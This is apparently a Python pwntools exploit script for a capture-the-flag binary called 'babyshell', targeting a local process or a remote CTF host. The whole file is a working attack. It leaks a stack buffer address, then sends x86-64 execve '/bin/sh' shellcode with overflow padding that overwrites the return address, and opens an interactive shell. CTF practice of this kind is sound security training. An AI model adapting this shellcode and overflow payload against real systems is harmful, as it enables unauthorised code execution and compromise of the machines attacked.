#!/usr/bin/python
from pwn import *

LOCAL = True
# 64-bit cablable shellcode from: 
# https://www.exploit-db.com/exploits/42179
shellcode = b"\x50\x48\x31\xf6\x56\x48\xbf\x2f\x62"
shellcode += b"\x69\x6e\x2f\x2f\x73\x68\x57\x54"
shellcode += b"\x5f\x6a\x3b\x58\x99\x0f\x05"

# After the choice and the read call we need 72 character until we overflow 
# the buffer
stack_len = 72

if LOCAL:
    p = process("./babyshell")
else:
    p = remote("ctf.uniwa.gr",31468)


p.recvuntil('>')
# send our choice
p.sendline("2")
p.recvuntil('>')
# send 10 characters
p.sendline(b"a" * 9)
# flush the buffer
p.recvuntil('[')
# grab the leaked address and convert it into an integer
buffer = int(p.recvuntil(']', drop=True)[2:].decode(),16)
log.info(f"Leaked buffer address: [{hex(buffer)}]")
# our payload is shellcode + overflow padding + the leaked address
payload = shellcode + (b"a" * (stack_len - len(shellcode))) + p64(buffer)

# send the payload
p.sendline(payload)
# switch to an interactive shell
p.interactive()
